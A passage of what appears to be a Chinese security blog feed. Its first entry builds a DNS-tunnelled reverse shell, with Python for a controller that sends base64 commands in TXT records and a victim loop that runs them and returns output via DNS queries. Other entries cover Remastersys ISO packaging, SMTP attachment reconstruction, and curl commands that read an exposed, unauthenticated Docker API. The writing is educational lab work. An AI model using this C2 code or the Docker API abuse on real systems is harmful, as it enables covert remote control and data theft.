&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160811202642.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;在smtp那篇文章中，我们提过一层一层洋葱状的协议包裹，在这里，我们跳过以太、IP、UDP头，直接到DNS数据的部分。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;标志着数据开始的是Tran ID段，所有的问答信息都需要一定的机制来保证对应，这部分应该就是对应机制中的一部分。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;紧接着的Flags，0x0100表明了一些查询属性。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Queries中是我们所要查询的host，查询类型。作为A类型查询，得到的是host的IP，这里也是我们做手脚的地方，不过TXT类型可以插入一些附加的信息，更适合我们用来构造命令语句。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;服务器回应包如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160812100828.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;作为回应的Tran ID，它和查询包相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;Flags中标准回应标志位&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;重复显示的Queries&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;回应的Answers信息。通过CNAME查取主机规范名，再通过规范名查取对应IP。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;利用这种相互应答的特性，我们初步计划通过以下流程来实现我们的反弹Shell&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;被控端：  发送DNS请求——&amp;gt;  接收回应并解析执行命令  ——&amp;gt;   发送DNS请求
              |                    /|\               |
              |                     |                |
              |                     |                |
             \|/                    |               \|/
控制端： 接收DNS请求并解析命令回显——发送添加了命令的回应——接收DNS并解析命令
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x03-程序&quot;&gt;&lt;a href=&quot;#0x03-程序&quot; class=&quot;headerlink&quot; title=&quot;0x03 程序&quot;&gt;&lt;/a&gt;0x03 程序&lt;/h2&gt;&lt;p&gt;原始的程序可以在上面的github中找到，这里贴出我们去掉加解密的部分程序。&lt;/p&gt;
&lt;p&gt;先说DNS服务器的部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def spawnShell(answer, payload):
  shellInput = raw_input(PROMPT)
  if shellInput == &amp;apos;quit&amp;apos;: EXIT = 1 
  if shellInput == &amp;apos;&amp;apos;: spawnShell(answer, payload) 
  out = base64.b64encode(shellInput)
  answer.add_answer(
     *dnslib.RR.fromZone(&amp;apos;{}.com 60 TXT &amp;quot;{}&amp;quot;&amp;apos;.format(payload, out)))
  return answer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一部分封装了对DNS的应答，payload里是被控端发来的查询信息，也就是上一次命令执行后的回显，而out是我们这一次的命令，封装成了TXT的应答包&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def recievePayload(udps):
  data, addr = udps.recvfrom(1024)
  dnsD = dnslib.DNSRecord.parse(data)
  payload = dnsD.questions[0].qname.label[0]
  answer = dnsD.reply()
  return addr, payload, answer
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分对于被控端的查询包进行解析，从中获取到地址和数据，对于数据，解析出其中的命令回显，并且初始化一个应答包。&lt;/p&gt;
&lt;p&gt;主函数中使用socket监听相关端口，对于监听到的包按照预定流程进行处理。&lt;/p&gt;
&lt;p&gt;再来看看被控端发送的部分&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def start(host):
  while 1:
    a = startConnection(host)
    cmd = parseCmd(a)
    stdoutput = runCmd(cmd)
    sendOutputToServer(stdoutput, host)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先是整个流程一览，从程序中可以很清晰的看到建立连接，解析命令，执行命令，发送回显的过程。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def startConnection(host):
  url = formURL(nextCommand)
  request = dns.message.make_query(url, dns.rdatatype.TXT)
  answers = dns.query.udp(request, host)
  a = answers.to_text()
  return a
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造的url，也就是命令回显，对于没有命令的，会返回nxt。利用回显构造查询语句。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def parseCmd(a):
def runCmd(cmd)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这两段程序对于收到的文本格式的命令进行解析和执行，没有太多的东西可以讲。只是注意格式的截取，并且考虑对Linux和Windows的命令之间转换。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def sendOutputToServer(output, host):
  send =&amp;apos;&amp;apos;
  output_end = len(output)
  for chunk in output:
    send += chunk
    output_end -= 1
    if len(send) == 58:
      url = formURL(send)
      dnsMakeQuery(url, host)
      send =&amp;apos;&amp;apos;
    if output_end == 0:
      url = formURL(send)
      dnsMakeQuery(url, host)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分负责发送DNS查询，按照与服务器约定的格式构造包并且进行发送。&lt;/p&gt;
&lt;h2 id=&quot;0x04-测试&quot;&gt;&lt;a href=&quot;#0x04-测试&quot; class=&quot;headerlink&quot; title=&quot;0x04 测试&quot;&gt;&lt;/a&gt;0x04 测试&lt;/h2&gt;&lt;p&gt;我们需要先执行服务器端程序，然后执行被控端程序。我的服务端程序在一台Ubuntu主机上，被控端在我的Win10机器上。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121502.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;如图，是在Ubuntu上对Win10执行ipconfig命令的显示。&lt;/p&gt;
&lt;p&gt;我们再进行抓包分析：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121742.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;这是被控端第一次连接时发送的包，因为控制端还没有指令，第一次连接发送的是空包，其中Name的值bnh0就是我之前所说的NXT&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121858.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;而第二个包就是控制端发送的指令，在TXT中发送的就是指令whoami的base64编码，&lt;/p&gt;
&lt;p&gt;可以对比和我之前实际抓包的不同之处，对照可以看出我们在DNS包的哪些地方做过修改。&lt;/p&gt;
&lt;h2 id=&quot;0x05-延伸&quot;&gt;&lt;a href=&quot;#0x05-延伸&quot; class=&quot;headerlink&quot; title=&quot;0x05 延伸&quot;&gt;&lt;/a&gt;0x05 延伸&lt;/h2&gt;&lt;p&gt;其实相关的DNS隧道技术原理应该差不多，都是在本来应该放DNS规定信息的地方放入了其他的东西，来达到一些意想不到的结果。&lt;/p&gt;
&lt;p&gt;当然，RFC还有许多协议可以让我随意构造去做测试，下一步考虑写一个多协议支持的Fuzzing工具   ：）&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.coding.me/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="DNS" scheme="http://phantom0301.coding.me/tags/DNS/"/>
    
      <category term="协议分析" scheme="http://phantom0301.coding.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu服务器下Remastersys系统打包</title>
    <link href="http://phantom0301.coding.me/2016/08/08/Remastersys/"/>
    <id>http://phantom0301.coding.me/2016/08/08/Remastersys/</id>
    <published>2016-08-08T13:08:13.000Z</published>
    <updated>2016-08-08T13:32:18.906Z</updated>
    
    <content type="html">&lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;0x01-安装&quot;&gt;&lt;a href=&quot;#0x01-安装&quot; class=&quot;headerlink&quot; title=&quot;0x01 安装&quot;&gt;&lt;/a&gt;0x01 安装&lt;/h2&gt;&lt;p&gt;这里主要是对使用过程中收集到资料的总结。主要是经过了测试。&lt;/p&gt;
&lt;p&gt;我的系统是官网下下来的Ubuntu server14.04。&lt;/p&gt;
&lt;p&gt;首先，网上大多数的教程使用添加非官方源的方法自动安装，我在添加密钥时迷之失败了，所以使用下面这篇博客的方法成功率更高。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/chenkun1/p/5532977.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/chenkun1/p/5532977.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;访问&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.filewatcher.com&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.filewatcher.com  &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;搜索&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;remastersys_3.0.4-2_all.deb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;考虑若干年后有可能找不到资源，我会上传一份到我的github&lt;/p&gt;
&lt;p&gt;下载安装包后，存放到合适的目录，在目录下执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install plymouth-x11 
sudo dpkg -i remastersys_3.0.4-2_all.deb
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，就可以执行remastersys指令。&lt;/p&gt;
&lt;h2 id=&quot;0x02-使用&quot;&gt;&lt;a href=&quot;#0x02-使用&quot; class=&quot;headerlink&quot; title=&quot;0x02 使用&quot;&gt;&lt;/a&gt;0x02 使用&lt;/h2&gt;&lt;p&gt;具体指令的解释，网上有很多。大致我们会用到backup和dist两种方式，backup可以说是对整个系统完全打包，考虑到我们并不需要泄露自己的个人信息，大多数时候我们是使用dist方式做发行&lt;/p&gt;
&lt;p&gt;参考这篇文章，不过文章里有指令打错了，请注意。&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/kulin/archive/2012/07/27/Custom_UbuntuLiveCD_Remastersys.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单说，我们顺序执行以下几条命令：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
sudo remastersys dist iso filename.iso
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将iso移动到安全的地方后，执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys clean
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;清理掉生成iso时的辅助文件，当然，iso也会被删掉，所以请先将iso移动到安全的地方。&lt;/p&gt;
&lt;h2 id=&quot;0x03-问题&quot;&gt;&lt;a href=&quot;#0x03-问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 问题&quot;&gt;&lt;/a&gt;0x03 问题&lt;/h2&gt;&lt;p&gt;做为服务器版，我在执行 &lt;em&gt;remastersys dist cdfs&lt;/em&gt; 命令时报错，根据报错信息中提到的 &lt;em&gt;ubiquity&lt;/em&gt; 信息，我找到了如下的解决方法：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zgyrelax/article/details/18228629&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/zgyrelax/article/details/18228629&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;简单粗暴点，你需要做的就是执行下面的这条命令&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get -y install ubiquity*
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;此时，系统会提示你安装相关环境，接着执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get -f install
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;等到一切安装结束后，再次执行&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo remastersys dist cdfs
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以及后面的步骤，就可以顺利打包系统。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;在不稳定的网络环境下，多次反复安装才组建完成的环境支持完美的Ubuntu系统，怎么能够让痛苦的安装过程轮回发生呢？使用Remastersys打包你的系统，进而分发给需要它的小伙伴吧。&lt;br&gt;
    
    </summary>
    
      <category term="ubuntu" scheme="http://phantom0301.coding.me/categories/ubuntu/"/>
    
    
      <category term="iso" scheme="http://phantom0301.coding.me/tags/iso/"/>
    
      <category term="ubuntu" scheme="http://phantom0301.coding.me/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>SMTP协议附件数据流抓取与还原</title>
    <link href="http://phantom0301.coding.me/2016/08/01/SMTP/"/>
    <id>http://phantom0301.coding.me/2016/08/01/SMTP/</id>
    <published>2016-08-01T13:00:54.000Z</published>
    <updated>2016-08-04T07:51:15.196Z</updated>
    
    <content type="html">&lt;p&gt;SMTP作为一种广泛使用的文件传输协议，已经和POP等协议一同构成了电子邮件系统传输的基石，针对于协议的分析也有很多书籍和博文可以参考，但是在这当中，对于MIME附件的数据流还原能找到的参考不多，所以在这里记下实践心得。&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x00-基础知识&quot;&gt;&lt;a href=&quot;#0x00-基础知识&quot; class=&quot;headerlink&quot; title=&quot;0x00 基础知识&quot;&gt;&lt;/a&gt;0x00 基础知识&lt;/h2&gt;&lt;p&gt;1.数据包的层级关系&lt;/p&gt;
&lt;p&gt;SMTP通过TCP协议进行传输，在这之前不得不再复习一下数据包的构成关系。&lt;/p&gt;
&lt;p&gt;一个典型的SMTP包将会由一下几部分构成：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ethernet{首部，数据部（IP{首部，数据部（TCP{首部，数据部}）}）}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;从上面的结构可以看出数据链路层、网络层、传输层上面的协议是嵌套关系，高层次的完整数据包作为底层次协议中的数据部。&lt;/p&gt;
&lt;p&gt;打个比方，如果我们要发送“Hello World！”的信息，正文信息将会在编码后加上TCP头成为TCP包，而TCP包会作为IP包的数据部，和IP头组成IP包，以此类推，以太网包就是首部加上IP包。&lt;/p&gt;
&lt;p&gt;不同的层次被赋予了不同的职责，我们要传送的实体信息是一切的基石，TCP头则负责告知收发双方的端口号并通过序号和校验保证数据的顺序和完整性；IP头负责告知收发双方的IP地址；eth头负责告知收发双发的MAC地址。&lt;/p&gt;
&lt;p&gt;2.SMTP协议&lt;/p&gt;
&lt;p&gt;SMTP协议的具体含义网上可以很轻易的得到。&lt;/p&gt;
&lt;p&gt;这里插一句，早期的SMTP实现过程是这样的，发送方写好一份邮件存在自己的硬盘上，通过TCP连接直接将邮件转到接收者的硬盘中，如果发送成功，发送者的硬盘就会删除邮件。否则，将会等待重发。&lt;/p&gt;
&lt;p&gt;很明显，上述实现过程在现代复杂网络中已经显得十分简陋，其他的先不说，这种机制首先必须要求收发方都要在线，这大大制约了电子邮件的发送。因此，邮件服务器就应运而生，二十四小时持续运转的邮件服务器可以使得邮件的发送不用在收到时间的限制。电子邮件系统雏形也就这样诞生了。&lt;/p&gt;
&lt;p&gt;由于需要与邮件服务器交流，便产生了相应的操作指令和状态码，详细的操作指令和状态码也可以很容易的从网络获得。今天，当我们发送邮件时，邮件客户端帮我们完成了SMTP指令的交互，我们只需要关系邮件实体的相关内容即可。&lt;/p&gt;
&lt;p&gt;3.MIME格式&lt;/p&gt;
&lt;p&gt;最初的邮件只能传输文本，这显然无法满足我们的交流需求。MIME的出现就是为了丰富邮件传输的类型，与此同时，我们可以在邮件附件中添加图片、动画、声音和程序。&lt;/p&gt;
&lt;p&gt;MIME主要由首部和正文组成，通过“Content-Type”确定发送富文本的类型，常用的类型有：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;text/plain  纯文本
mutipart/mixed  多部分组成
application/octet-stream  二进制数据
image/jpeg  jpeg图像
video/mpeg  mpeg动画
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;当声明为多部分组成时，通过“boundary”来进行分割。&lt;/p&gt;
&lt;h2 id=&quot;0x01-邮件发送&quot;&gt;&lt;a href=&quot;#0x01-邮件发送&quot; class=&quot;headerlink&quot; title=&quot;0x01 邮件发送&quot;&gt;&lt;/a&gt;0x01 邮件发送&lt;/h2&gt;&lt;p&gt;为了便于我们进行分析，我们在本地的另一台Ubuntu主机上搭建SMTP服务器，通过Python程序在本机上发送邮件到Ubuntu主机上，这样就能实现一个可控的操作环境。&lt;/p&gt;
&lt;p&gt;在Ubuntu上安装Postfix和SMTP服务&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;apt-get install postfix
apt-get install mailutils
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;完成之后，我们可以在本机上使用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;telnet Ubuntu的IP 25
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;来验证是否搭建成功&lt;/p&gt;
&lt;p&gt;搭建完成后我们来编写一个可以传输MIME附件的Pyhton程序，关键代码如下：&lt;br&gt;需要的Python库&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from email.header import Header
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;先初始化发送邮箱，邮件服务器，邮箱认证账号密码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;def init():  
    sender = 
    smtpserver = 
    username = 
    password = 
    return sender, smtpserver, username, password
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;发送部分调用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;msg = MIMEMultipart(&amp;apos;alternative&amp;apos;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在msg中添加邮件来源、主题、正文内容。附件部分这样处理&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;att = MIMEText(open(&amp;apos;1.jpg&amp;apos;, &amp;apos;rb&amp;apos;).read(), &amp;apos;base64&amp;apos;, &amp;apos;utf-8&amp;apos;)
att[&amp;quot;Content-Type&amp;quot;] = &amp;apos;application/octet-stream&amp;apos;
att[&amp;quot;Content-Disposition&amp;quot;] = &amp;apos;attachment;filename=&amp;quot;1.jpg&amp;quot;&amp;apos;
msg.attach(att)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;信息添加完整后，调用smtp来发送&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;smtp = smtplib.SMTP()
smtp.connect(&amp;apos;邮件服务器地址&amp;apos;)
smtp.login(username, password)
smtp.sendmail(sender, receiver, msg.as_string())
smtp.quit()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;整个实践的基础环境就可用了。&lt;/p&gt;
&lt;h2 id=&quot;0x02-附件数据流抓取与解析&quot;&gt;&lt;a href=&quot;#0x02-附件数据流抓取与解析&quot; class=&quot;headerlink&quot; title=&quot;0x02 附件数据流抓取与解析&quot;&gt;&lt;/a&gt;0x02 附件数据流抓取与解析&lt;/h2&gt;&lt;p&gt;同样使用Python来编写（╮(╯▽╰)╭，Python用的熟），主要从网卡抓取到流量，先还原为完整的数据包，再做编码转换，将一个完整的邮件发送过程中的命令交互和邮件内容分别还原出来。&lt;/p&gt;
&lt;p&gt;程序监听网卡后，过滤出端口为25的tcp协议，过滤后的数据包大体结构如下所示：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Ethernet(dst=&amp;apos;xxx&amp;apos;, src=&amp;apos;xxx&amp;apos;, data=IP(len=78, id=44381, off=16384, p=6, sum=52034, src=&amp;apos;xxx&amp;apos;, dst=&amp;apos;xxx&amp;apos;, opts=&amp;apos;&amp;apos;, data=TCP(sport=25, dport=45675, seq=175475907, ack=2692538927L, flags=24, win=229, sum=40326, opts=&amp;apos;&amp;apos;, data=&amp;apos;220 localhost ESMTP Postfix (Ubuntu)\r\n&amp;apos;)))
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;和我们在基础知识中提到的数据包结构一样，这里完整的获得了从Ethernet到TCP层的数据。这一条抓取到是Ubuntu邮件服务器发送给我们的欢迎信息。当然，大概了解了抓取到的包解构后，略过其他重要信息，我们直奔主题，去寻找数据包中附件的部分。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160802213609.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了便于展示，这里使用Wireshark重复再抓取一次电子邮件的包，可以从图中看到，这些被分割成相同的1440bytes大小的数据包就是我们所传的图片附件，而在我们的程序中，它是接下来这个样子的，数据较长，这里截取一部分。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Content-Type: multipart/alternative; 

boundary=&amp;quot;===============0786123174==&amp;quot;\r\n

MIME-Version: 1.0\r\n

From: \r\n

Subject: \r\n\r\n
--===============0786123174==\r\n
Content-Type: text/plain; 
charset=&amp;quot;us-ascii&amp;quot;\r\n
MIME-Version: 1.0\r\n
Content-Transfer-Encoding: 7bit\r\n\r\n123456\r\n
--===============0786123174==\r\n
Content-Type: image/png\r\n
MIME-Version: 1.0\r\n
Content-Transfer-Encoding: base64\r\n
Content-ID: application/octet-stream\r\n


iVBORw0KGgoAAAANSUhEUgAAAKoAAA
FHCAYAAAAx29dqAAAgAElEQVR4nKy9d5T
c2XXfeSt0d3XO\r\nOQNooLuR02ByYpjhcEi
KSTYlS5S0+4dE7ZElK9iWLC+8Pmd3La20K1
nBa3ltr5UlUiaXEidxhhPA\r\nmUEaAING6Eb
onFN1d3VVdcW9n/v7vUIDA1IkjwqnUNW/
+oX37vvefN97gf/9f/2/89PT01JdXSWV\r\n
lZWytLwsHR0dsh5dk83NTVldXZWmpiZpa
GiQYDAonDs2NiadnZ2yrOc+9NBDcvvWL
akor5BUKmXn\r\nXbly
.............
.............
.............
l7wVOj83I4AAAAASUVORK5CYII=\r\n
--===============0786123174==--\r\n
.\r\n
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单分析一下，在这里，我们传递的真是多MIME的邮件，第一个分隔符以上说明是多部分合在一起，第一段内是邮件的发送者信息和标题，第二段是我们传递的邮件正文，第三段是附件。重点再看一下第三部分，第三部分首先声明了附件类型、编码方式,紧接着就是文件二进制的base64编码。&lt;/p&gt;
&lt;p&gt;通过上述分析，为了能够还原出附件，我们大致需要进行以下步骤：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;准确分离出一封完整的邮件&lt;/li&gt;
&lt;li&gt;准确分离出附件段&lt;/li&gt;
&lt;li&gt;从附件段分离出附件的base64编码正文&lt;/li&gt;
&lt;li&gt;将base64解码为二进制文件&lt;/li&gt;
&lt;li&gt;获取当前文件类型，保存二进制文件为当前文件类型&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;一次完整的发送过程包括若干次完整的包，我们需要保存这一次发送中的若干个包，这就需要我们在捕捉到的多次发送包中先匹配出邮件开始和结束的标志，从上面可以看到，邮件结束时都使用一个单行的“.”来标志。我们匹配出完整的邮件包后，根据边界标志来匹配出附件部分的文件类型声明和编码正文，得到正文后我们使用Python的base64模块进行解码，将解码后的文件存成相应类型，就基本完成了附件的还原。&lt;/p&gt;
&lt;h2 id=&quot;0x03-存在的问题&quot;&gt;&lt;a href=&quot;#0x03-存在的问题&quot; class=&quot;headerlink&quot; title=&quot;0x03 存在的问题&quot;&gt;&lt;/a&gt;0x03 存在的问题&lt;/h2&gt;&lt;p&gt;上面对于一次单一的发送行为做了附件还原，但其实还有很多问题有待解决。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;TCP发送过程中存在重复发送和乱序的问题，需要一定的机制去做判断，暂时想到的方法是使用TCP包中的Seq和Ack参数按照包编号和大小去逐个递增查找&lt;/li&gt;
&lt;li&gt;多个发送行为存在的时候，如何在可能交叉的发送包中匹配出一次完整的发送包&lt;/li&gt;
&lt;li&gt;当发送程序使用不同的编码时，还需要获取到编码方式再对应进行解码&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;接下来将会侧重于这部分问题解决方法的探索~~ &lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;SMTP作为一种广泛使用的文件传输协议，已经和POP等协议一同构成了电子邮件系统传输的基石，针对于协议的分析也有很多书籍和博文可以参考，但是在这当中，对于MIME附件的数据流还原能找到的参考不多，所以在这里记下实践心得。&lt;/p&gt;
    
    </summary>
    
      <category term="安全基础" scheme="http://phantom0301.coding.me/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="SMTP" scheme="http://phantom0301.coding.me/tags/SMTP/"/>
    
      <category term="协议分析" scheme="http://phantom0301.coding.me/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>再探Docker-另类Docker安全</title>
    <link href="http://phantom0301.coding.me/2016/07/21/Docker3/"/>
    <id>http://phantom0301.coding.me/2016/07/21/Docker3/</id>
    <published>2016-07-21T05:53:06.000Z</published>
    <updated>2016-08-04T08:00:35.132Z</updated>
    
    <content type="html">&lt;p&gt;Docker怎么做才能在被别人拿到SHELL后将危害做到最小？&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;0x01-别人说&quot;&gt;&lt;a href=&quot;#0x01-别人说&quot; class=&quot;headerlink&quot; title=&quot;0x01 别人说&quot;&gt;&lt;/a&gt;0x01 别人说&lt;/h2&gt;&lt;p&gt;Docker安全的问题有许多的相关文章分析，援引“Docker安全那些事”中提到的，Docker安全具体应该说分为Docker自身安全和Docker镜像安全两种，Docker之前有记录的漏洞分别是1.3和1.6，而现在的版本已经到1.12，到现在为止都没有再爆出漏洞的信息，而且Docker自身的安全往往是和Linux的底层功能息息相关的，这也是我不懂的领域。&lt;/p&gt;
&lt;p&gt;还有一个特别的点就是Docker的远程调用API接口存在未授权访问，但其实导致这个问题的是Docker的服务端程序Docker daemon被绑定到了公网的端口上，并且没有增加认证。默认情况下Docker daemon使用的是sock监听，本身只有root和docker用户组才有权限，所以不进行验证。换句话说，如果你不打算通过网络执行Docker命令或者增加证书验证的环节,这种漏洞就可以避免。&lt;/p&gt;
&lt;p&gt;我们可以在本地复现一下这个漏洞，首先我们关闭Docker daemon的本地sock，开启远程访问，并绑定端口。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;service stop docker
docker daemon -H unix:///var/run/docker.sock -H 0.0.0.0:9090
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;之后我们访问&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl http://127.0.0.1:9090/containers/json
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们来获取一些敏感的信息&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl http://127.0.0.1:9090/containers/(id)/logs?stdout=1

curl http://127.0.0.1:9090/containers/(id)/json
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;另外通过Post包我们还可以新建、开启和关闭容器。&lt;/p&gt;
&lt;p&gt;相关的参考文件：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://yq.aliyun.com/articles/48689&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://yq.aliyun.com/articles/48689&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://cache.baiducontent.com/c?m=9f65cb4a8c8507ed4fece7631040973b5b1597634b928d483493cf5f93130601127ba5e065635559809e203c4bee084beb812173401420b786cb8d4cdebf8f3c6ad567627f4adb104b8459b8ca3632b122872ae9b868edad834284afa2c4ae5244bb56120c82e7f8511715ba7881672692a6&amp;amp;p=8b2a9715d9c042a40caa8c0c4e47c6&amp;amp;newp=817ec54ad5c04ab94ebcc7710f0090231615d70e37d1da01298ffe0cc4241a1a1a3aecbf26201403d6cf7f6604a94c5feff53c78340634f1f689df08d2ecce7e399e76&amp;amp;user=baidu&amp;amp;fm=sc&amp;amp;query=Docker%B0%B2%C8%AB%C4%C7%D0%A9%CA%C2&amp;amp;qid=e65331f700005115&amp;amp;p1=5&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Docker安全那些事&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.91ri.org/15837.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.91ri.org/15837.html&lt;/a&gt;&lt;/p&gt;
